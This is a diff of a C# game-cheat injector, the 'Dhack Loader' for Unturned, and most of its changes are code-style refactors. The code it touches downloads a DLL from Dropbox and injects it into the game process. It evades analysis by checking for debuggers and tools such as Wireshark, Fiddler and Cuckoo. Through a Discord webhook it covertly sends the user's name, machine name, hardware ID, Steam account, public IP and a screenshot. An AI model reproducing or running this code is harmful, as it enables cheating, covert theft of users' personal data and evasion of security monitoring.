@@ -101,8 +101,8 @@ namespace Unturend_Injector
                 return;
             }
 
-            await SecurityReport(hwid, debugMode);
-            await RunInjectorAsync(debugMode, selectedLanguage, hwid);
+            await SecurityReport(hwid, debugMode).ConfigureAwait(false);
+            await RunInjectorAsync(debugMode, selectedLanguage, hwid).ConfigureAwait(false);
         }
 
         private static void StartProcessMonitor(string language)
@@ -128,7 +128,10 @@ namespace Unturend_Injector
                         catch { }
                     };
                     _processWatcher.Start();
-                    while (true) Thread.Sleep(1000);
+                    while (true)
+                    {
+                        Thread.Sleep(1000);
+                    }
                 }
                 catch (Exception ex) { Logger.Log($"{GetLanguageValue(language, LanguageKeys.ProcessMonitorFailed)}: {ex.Message}", ConsoleColor.Red); }
             })
@@ -143,14 +146,14 @@ namespace Unturend_Injector
                 string tempPath = Path.GetTempPath();
                 string videoPath = Path.Combine(tempPath, AlertVideoFileName);
 
-                using (var client = new WebClient())
+                using (WebClient client = new())
                 {
                     client.DownloadFile(AlertVideoUrl, videoPath);
                 }
 
                 if (File.Exists(videoPath))
                 {
-                    Process.Start(new ProcessStartInfo
+                    _ = Process.Start(new ProcessStartInfo
                     {
                         FileName = videoPath,
                         UseShellExecute = true,
@@ -200,15 +203,19 @@ namespace Unturend_Injector
             }
 
             // Общий метод для вывода цветных сообщений
-            void ShowColoredMessage(params string[] messages)
+            static void ShowColoredMessage(params string[] messages)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                foreach (var msg in messages) Console.WriteLine(msg);
+                foreach (string msg in messages)
+                {
+                    Console.WriteLine(msg);
+                }
+
                 Console.ResetColor();
             }
 
             // Общий метод для звукового оповещения (раскомментировать при необходимости)
-            //Console.Beep(3000, 1000);
+            Console.Beep(3000, 1000);
 
 
 
@@ -239,20 +246,34 @@ namespace Unturend_Injector
         private static bool CheckSecurityEnvironment(bool debugMode, string language)
         {
             bool securityIssue = CheckExistingProcesses(language, debugMode);
-            if (!debugMode) securityIssue |= CheckDebugger() || CheckAnalysisTools() || CheckHardwareBreakpoints(debugMode) || CheckSuspendedState(debugMode);
-            else securityIssue |= CheckSuspendedState(debugMode);
+            if (!debugMode)
+            {
+                securityIssue |= CheckDebugger() || CheckAnalysisTools() || CheckHardwareBreakpoints(debugMode) || CheckSuspendedState(debugMode);
+            }
+            else
+            {
+                securityIssue |= CheckSuspendedState(debugMode);
+            }
+
             return securityIssue;
         }
 
         private static bool CheckExistingProcesses(string language, bool debugMode)
         {
-            IEnumerable<string> filteredProcesses = debugMode ? BadProcesses.Where(p => !p.Equals("HTTPDebugger") && !p.Equals("Fiddler")) : BadProcesses;
+            IEnumerable<string> filteredProcesses = debugMode ? BadProcesses.Where(p => !p.Equals("HTTPDebugger", StringComparison.Ordinal) && !p.Equals("Fiddler", StringComparison.Ordinal)) : BadProcesses;
             List<Process> processes = Process.GetProcesses().Where(p => filteredProcesses.Any(bad => string.Equals(p.ProcessName, bad, StringComparison.OrdinalIgnoreCase))).ToList();
             return processes.Any();
         }
 
-        private static bool CheckDebugger() => Debugger.IsAttached || Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") == "1";
-        private static bool CheckAnalysisTools() => Process.GetProcesses().Any(p => new[] { "joebox", "cuckoo", "anubis", "wireshark", "fiddler", "netmon", "Sysmon" }.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase));
+        private static bool CheckDebugger()
+        {
+            return Debugger.IsAttached || Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") == "1";
+        }
+
+        private static bool CheckAnalysisTools()
+        {
+            return Process.GetProcesses().Any(p => new[] { "joebox", "cuckoo", "anubis", "wireshark", "fiddler", "netmon", "Sysmon" }.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase));
+        }
 
         [StructLayout(LayoutKind.Sequential)]
         public struct CONTEXT
@@ -268,7 +289,11 @@ namespace Unturend_Injector
 
         private static bool CheckHardwareBreakpoints(bool debugMode)
         {
-            if (debugMode) return false;
+            if (debugMode)
+            {
+                return false;
+            }
+
             try
             {
                 CONTEXT context = new() { ContextFlags = 0x10 };
@@ -283,10 +308,10 @@ namespace Unturend_Injector
             try
             {
                 CleanupOldFiles(new[] { dllPath }, debugMode);
-                Process targetProcess = await FindOrStartUnturnedProcess(selectedLanguage, debugMode);
+                Process targetProcess = await FindOrStartUnturnedProcess(selectedLanguage, debugMode).ConfigureAwait(false);
                 if (targetProcess == null || !ValidateProcess(targetProcess, selectedLanguage, debugMode))
                 {
-                    await SendErrorToDiscord("Process Validation Failed", GetLanguageValue(selectedLanguage, LanguageKeys.ProcessValidationFailed), debugMode);
+                    await SendErrorToDiscord("Process Validation Failed", GetLanguageValue(selectedLanguage, LanguageKeys.ProcessValidationFailed), debugMode).ConfigureAwait(false);
                     Pause(selectedLanguage);
                     return;
                 }
@@ -295,17 +320,17 @@ namespace Unturend_Injector
                 Console.WriteLine($"\n{string.Format(GetLanguageValue(selectedLanguage, LanguageKeys.DownloadStart), TargetDll)}");
                 Console.ResetColor();
 
-                if (!await DownloadFileWithProgress("https://www.dropbox.com/scl/fi/0qh67q1y0hje883sap5ub/DHackLoader.dll?rlkey=5jqnufl1e9dcxrp01vyzltycm&st=hvziuz0v&dl=1", dllPath, selectedLanguage, debugMode, TargetDll))
+                if (!await DownloadFileWithProgress("https://www.dropbox.com/scl/fi/0qh67q1y0hje883sap5ub/DHackLoader.dll?rlkey=5jqnufl1e9dcxrp01vyzltycm&st=hvziuz0v&dl=1", dllPath, selectedLanguage, debugMode, TargetDll).ConfigureAwait(false))
                 {
-                    await SendErrorToDiscord("DLL Download Failed", GetLanguageValue(selectedLanguage, LanguageKeys.DownloadFailed), debugMode);
+                    await SendErrorToDiscord("DLL Download Failed", GetLanguageValue(selectedLanguage, LanguageKeys.DownloadFailed), debugMode).ConfigureAwait(false);
                     Pause(selectedLanguage);
                     return;
                 }
 
-                var (Success, ErrorMessage) = InjectDll(targetProcess.Id, dllPath, selectedLanguage, debugMode);
+                (bool Success, string ErrorMessage) = InjectDll(targetProcess.Id, dllPath, selectedLanguage, debugMode);
                 if (!Success)
                 {
-                    await SendErrorToDiscord("Injection Failed", $"{GetLanguageValue(selectedLanguage, LanguageKeys.InjectionFailed)}: {ErrorMessage}", debugMode);
+                    await SendErrorToDiscord("Injection Failed", $"{GetLanguageValue(selectedLanguage, LanguageKeys.InjectionFailed)}: {ErrorMessage}", debugMode).ConfigureAwait(false);
                     Pause(selectedLanguage);
                     return;
                 }
@@ -315,13 +340,13 @@ namespace Unturend_Injector
                 Console.ResetColor();
 
                 byte[] screenshot = CaptureScreenshot();
-                await SendInjectionReport(targetProcess, screenshot, debugMode);
+                await SendInjectionReport(targetProcess, screenshot, debugMode).ConfigureAwait(false);
                 CleanupOldFiles(new[] { dllPath }, debugMode);
-                await MonitorProcessAsync(targetProcess, selectedLanguage, debugMode);
+                await MonitorProcessAsync(targetProcess, selectedLanguage, debugMode).ConfigureAwait(false);
             }
             catch (Exception ex)
             {
-                await SendErrorToDiscord("Critical Error", ex.Message, debugMode);
+                await SendErrorToDiscord("Critical Error", ex.Message, debugMode).ConfigureAwait(false);
                 Logger.Log($"{GetLanguageValue(selectedLanguage, LanguageKeys.CriticalError)}: {ex}", ConsoleColor.Red);
             }
             finally
@@ -357,9 +382,16 @@ namespace Unturend_Injector
                 for (int i = 0; i < 10; i++)
                 {
                     Process p = GetTargetProcess("Unturned");
-                    if (p != null) return p;
-                    await Task.Delay(1000);
-                    if (debugMode) Console.Write($"\r{GetLanguageValue(language, LanguageKeys.ProcessInitWait)} {i + 1}/10");
+                    if (p != null)
+                    {
+                        return p;
+                    }
+
+                    await Task.Delay(1000).ConfigureAwait(false);
+                    if (debugMode)
+                    {
+                        Console.Write($"\r{GetLanguageValue(language, LanguageKeys.ProcessInitWait)} {i + 1}/10");
+                    }
                 }
                 Logger.Log(GetLanguageValue(language, LanguageKeys.ProcessInitFailed), ConsoleColor.Red);
                 return null;
@@ -383,21 +415,29 @@ namespace Unturend_Injector
                 Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessFound), targetProcess.ProcessName, targetProcess.Id), ConsoleColor.Green);
                 return targetProcess;
             }
-            return await StartNewProcess(language, debugMode);
+            return await StartNewProcess(language, debugMode).ConfigureAwait(false);
         }
 
         private static async Task SendInjectionReport(Process process, byte[] screenshot, bool debugMode)
         {
             string message = $"✅ {GetLanguageValue("English", LanguageKeys.InjectionSuccess)}\nPID: {process.Id}\n{GetLanguageValue("English", LanguageKeys.Runtime)}: {DateTime.Now:HH:mm:ss}";
-            if (screenshot == null) message += $"\n⚠️ {GetLanguageValue("English", LanguageKeys.ScreenshotFailed)}";
-            await SendToDiscordWebhook(message, "success", debugMode, screenshot);
+            if (screenshot == null)
+            {
+                message += $"\n⚠️ {GetLanguageValue("English", LanguageKeys.ScreenshotFailed)}";
+            }
+
+            await SendToDiscordWebhook(message, "success", debugMode, screenshot).ConfigureAwait(false);
         }
 
         private static void SecureDelete(string path, int passes)
         {
             try
             {
-                if (!File.Exists(path)) return;
+                if (!File.Exists(path))
+                {
+                    return;
+                }
+
                 File.SetAttributes(path, FileAttributes.Normal);
                 long length = new FileInfo(path).Length;
                 using (FileStream fs = new(path, FileMode.Open))
@@ -412,7 +452,10 @@ namespace Unturend_Injector
                     }
                 }
                 File.Delete(path);
-                if (File.Exists(path)) File.Delete(path);
+                if (File.Exists(path))
+                {
+                    File.Delete(path);
+                }
             }
             catch { }
         }
@@ -446,8 +489,12 @@ namespace Unturend_Injector
             {
                 FieldInfo flags = typeof(Assembly).GetField("m_flags", BindingFlags.NonPublic | BindingFlags.Instance);
                 if (flags != null)
+                {
                     foreach (Assembly asm in AppDomain.CurrentDomain.GetAssemblies())
+                    {
                         flags.SetValue(asm, (int)flags.GetValue(asm) | 0x80);
+                    }
+                }
             }
             catch { }
         }
@@ -461,12 +508,18 @@ namespace Unturend_Injector
                 foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                 {
                     nint threadHandle = OpenThread(THREAD_QUERY_INFORMATION, false, thread.Id);
-                    if (threadHandle == nint.Zero) continue;
+                    if (threadHandle == nint.Zero)
+                    {
+                        continue;
+                    }
 
                     THREAD_BASIC_INFORMATION tbi = new();
                     int status = NtQueryInformationThread(threadHandle, 0, ref tbi, Marshal.SizeOf(tbi), out _);
                     _ = CloseHandle(threadHandle);
-                    if (status == 0 && tbi.SuspendCount > 0) return true;
+                    if (status == 0 && tbi.SuspendCount > 0)
+                    {
+                        return true;
+                    }
                 }
                 return CheckHardwareBreakpoints(debugMode);
             }
@@ -525,7 +578,10 @@ namespace Unturend_Injector
             do
             {
                 key = Console.ReadKey(true);
-                if (key.Key != ConsoleKey.Enter) input += key.KeyChar;
+                if (key.Key != ConsoleKey.Enter)
+                {
+                    input += key.KeyChar;
+                }
             } while (key.Key != ConsoleKey.Enter);
             Console.WriteLine();
             return input;
@@ -575,7 +631,7 @@ namespace Unturend_Injector
         private static async Task SecurityReport(string hwid, bool debugMode)
         {
             (string Username, string Steam64Id) = GetSteamUser();
-            await SendToDiscordWebhook($"🔍 {GetLanguageValue("English", LanguageKeys.NewUserDetected)}\n{GetLanguageValue("English", LanguageKeys.User)}: {Environment.UserName}\n{GetLanguageValue("English", LanguageKeys.Machine)}: {Environment.MachineName}\nOS: {Environment.OSVersion.VersionString}\nHWID: {hwid}\nSteam User: {Username}\nSteam64 ID: {Steam64Id}\nIP: {await GetPublicIpAsync()}", "warning", debugMode);
+            await SendToDiscordWebhook($"🔍 {GetLanguageValue("English", LanguageKeys.NewUserDetected)}\n{GetLanguageValue("English", LanguageKeys.User)}: {Environment.UserName}\n{GetLanguageValue("English", LanguageKeys.Machine)}: {Environment.MachineName}\nOS: {Environment.OSVersion.VersionString}\nHWID: {hwid}\nSteam User: {Username}\nSteam64 ID: {Steam64Id}\nIP: {await GetPublicIpAsync().ConfigureAwait(false)}", "warning", debugMode).ConfigureAwait(false);
         }
 
         private static async Task SendToDiscordWebhook(string message, string status, bool debugMode, byte[] screenshot = null)
@@ -592,9 +648,11 @@ namespace Unturend_Injector
                     using ByteArrayContent contentPart = new(compressedScreenshot);
                     content.Add(contentPart, "file", "screenshot.jpg");
                 }
-                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content);
+                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content).ConfigureAwait(false);
                 if (debugMode && !response.IsSuccessStatusCode)
+                {
                     Console.WriteLine($"[ERROR] Discord send failed: {response.StatusCode}");
+                }
             }
             catch { }
         }
@@ -627,7 +685,11 @@ namespace Unturend_Injector
                 using Image image = Image.FromStream(inputStream);
                 EncoderParameters encoderParams = new(1) { Param = { [0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 75L) } };
                 ImageCodecInfo jpegCodec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(codec => codec.FormatID == ImageFormat.Jpeg.Guid);
-                if (jpegCodec != null) image.Save(outputStream, jpegCodec, encoderParams);
+                if (jpegCodec != null)
+                {
+                    image.Save(outputStream, jpegCodec, encoderParams);
+                }
+
                 return outputStream.ToArray();
             }
             catch { return screenshot; }
@@ -688,17 +750,30 @@ namespace Unturend_Injector
                                                 if (lines[i].Trim().StartsWith("\"AccountName\"", StringComparison.OrdinalIgnoreCase))
                                                 {
                                                     string[] parts = lines[i].Split(new[] { '\"' }, StringSplitOptions.RemoveEmptyEntries);
-                                                    if (parts.Length >= 3) accountName = parts[2];
+                                                    if (parts.Length >= 3)
+                                                    {
+                                                        accountName = parts[2];
+                                                    }
                                                 }
                                                 if (lines[i].Trim().StartsWith("\"MostRecent\"", StringComparison.OrdinalIgnoreCase))
                                                 {
                                                     string[] parts = lines[i].Split(new[] { '\"' }, StringSplitOptions.RemoveEmptyEntries);
-                                                    if (parts.Length >= 3 && parts[2] == "1") mostRecent = true;
+                                                    if (parts.Length >= 3 && parts[2] == "1")
+                                                    {
+                                                        mostRecent = true;
+                                                    }
                                                 }
-                                                if (lines[i].Trim() == "}") break;
+                                                if (lines[i].Trim() == "}")
+                                                {
+                                                    break;
+                                                }
+
                                                 i++;
                                             }
-                                            if (mostRecent) return (accountName, steamId);
+                                            if (mostRecent)
+                                            {
+                                                return (accountName, steamId);
+                                            }
                                         }
                                     }
                                     i++;
@@ -717,7 +792,7 @@ namespace Unturend_Injector
             try
             {
                 using HttpClient client = new();
-                return await client.GetStringAsync("https://api.ipify.org");
+                return await client.GetStringAsync("https://api.ipify.org").ConfigureAwait(false);
             }
             catch { return "Unknown"; }
         }
@@ -727,10 +802,10 @@ namespace Unturend_Injector
             try
             {
                 using HttpClient client = new();
-                HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
+                HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead).ConfigureAwait(false);
                 _ = response.EnsureSuccessStatusCode();
                 _ = Directory.CreateDirectory(Path.GetDirectoryName(savePath));
-                using Stream stream = await response.Content.ReadAsStreamAsync();
+                using Stream stream = await response.Content.ReadAsStreamAsync().ConfigureAwait(false);
                 using FileStream fileStream = new(savePath, FileMode.Create);
                 long totalBytes = response.Content.Headers.ContentLength ?? -1L;
                 byte[] buffer = new byte[8192];
@@ -742,9 +817,13 @@ namespace Unturend_Injector
                 Console.ResetColor();
                 while (true)
                 {
-                    int read = await stream.ReadAsync(buffer);
-                    if (read == 0) break;
-                    await fileStream.WriteAsync(buffer.AsMemory(0, read));
+                    int read = await stream.ReadAsync(buffer).ConfigureAwait(false);
+                    if (read == 0)
+                    {
+                        break;
+                    }
+
+                    await fileStream.WriteAsync(buffer.AsMemory(0, read)).ConfigureAwait(false);
                     bytesRead += read;
                     int currentPercentage = (int)((double)bytesRead / (totalBytes != -1 ? totalBytes : bytesRead) * 100);
                     if (currentPercentage != lastPercentage)
@@ -755,7 +834,11 @@ namespace Unturend_Injector
                 }
                 Console.CursorVisible = true;
                 Console.WriteLine("\n");
-                if (!File.Exists(savePath)) return false;
+                if (!File.Exists(savePath))
+                {
+                    return false;
+                }
+
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine(string.Format(GetLanguageValue(language, LanguageKeys.DownloadComplete), displayName));
                 Console.ResetColor();
@@ -805,7 +888,9 @@ namespace Unturend_Injector
         private static void CleanupOldFiles(string[] paths, bool debugMode)
         {
             foreach (string path in paths)
-                try { if (File.Exists(path)) { if (debugMode) Logger.Log($"Cleaning: {path}", ConsoleColor.DarkGray); File.Delete(path); } } catch { }
+            {
+                try { if (File.Exists(path)) { if (debugMode) { Logger.Log($"Cleaning: {path}", ConsoleColor.DarkGray); } File.Delete(path); } } catch { }
+            }
         }
 
         private static async Task SendErrorToDiscord(string errorType, string errorMessage, bool debugMode)
@@ -816,7 +901,7 @@ namespace Unturend_Injector
                 var embed = new { title = $"❌ {errorType}", description = errorMessage, color = 16711680, timestamp = DateTime.UtcNow.ToString("o"), footer = new { text = $"Dhack Loader v{GetAssemblyVersion()}" }, author = new { name = Environment.MachineName } };
                 var payload = new { username = "Dhack Error Reporter", embeds = new[] { embed } };
                 using MultipartFormDataContent content = new() { { new StringContent(JsonConvert.SerializeObject(payload)), "payload_json" } };
-                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content);
+                HttpResponseMessage response = await client.PostAsync(GetDiscordWebhookUrl(), content).ConfigureAwait(false);
             }
             catch { }
         }
@@ -826,18 +911,33 @@ namespace Unturend_Injector
             try
             {
                 Stopwatch timer = Stopwatch.StartNew();
-                while (!process.HasExited) await Task.Delay(1000);
-                if (debugMode) Logger.Log($"{GetLanguageValue(language, LanguageKeys.ProcessLifetime)}: {timer.Elapsed.TotalSeconds:F1}s", ConsoleColor.DarkGray);
+                while (!process.HasExited)
+                {
+                    await Task.Delay(1000).ConfigureAwait(false);
+                }
+
+                if (debugMode)
+                {
+                    Logger.Log($"{GetLanguageValue(language, LanguageKeys.ProcessLifetime)}: {timer.Elapsed.TotalSeconds:F1}s", ConsoleColor.DarkGray);
+                }
+
                 if (timer.Elapsed.TotalSeconds < 25)
                 {
                     Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ProcessClosedEarly), process.ProcessName), ConsoleColor.Red);
                     Console.ForegroundColor = ConsoleColor.Yellow;
                     Console.WriteLine(GetLanguageValue(language, LanguageKeys.RestartPrompt));
                     string input = Console.ReadLine()?.Trim().ToLower();
-                    if (input is "y" or "yes" or "д" or "да") RestartApplication(language);
+                    if (input is "y" or "yes" or "д" or "да")
+                    {
+                        RestartApplication(language);
+                    }
+
                     Console.WriteLine(GetLanguageValue(language, LanguageKeys.ReinjectPrompt));
                     input = Console.ReadLine()?.Trim().ToLower();
-                    if (input is "y" or "yes" or "д" or "да") await RunInjectorAsync(debugMode, language, "");
+                    if (input is "y" or "yes" or "д" or "да")
+                    {
+                        await RunInjectorAsync(debugMode, language, "").ConfigureAwait(false);
+                    }
                 }
             }
             catch { }
@@ -847,7 +947,10 @@ namespace Unturend_Injector
         {
             List<string> possiblePaths = GetPossibleExecutablePaths();
             string validPath = possiblePaths.FirstOrDefault(File.Exists);
-            if (validPath == null) Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ExeNotFoundMultiple), string.Join("\n", possiblePaths)), ConsoleColor.Red);
+            if (validPath == null)
+            {
+                Logger.Log(string.Format(GetLanguageValue(language, LanguageKeys.ExeNotFoundMultiple), string.Join("\n", possiblePaths)), ConsoleColor.Red);
+            }
             else
             {
                 try
@@ -876,7 +979,7 @@ namespace Unturend_Injector
 
         private static List<string> GetPossibleExecutablePaths()
         {
-            List<string> paths = new();
+            List<string> paths = [];
             foreach (DriveInfo drive in DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed))
             {
                 paths.Add(Path.Combine(drive.Name, "Program Files (x86)", "Steam", "steamapps", "common", "Unturned", "Unturned.exe"));
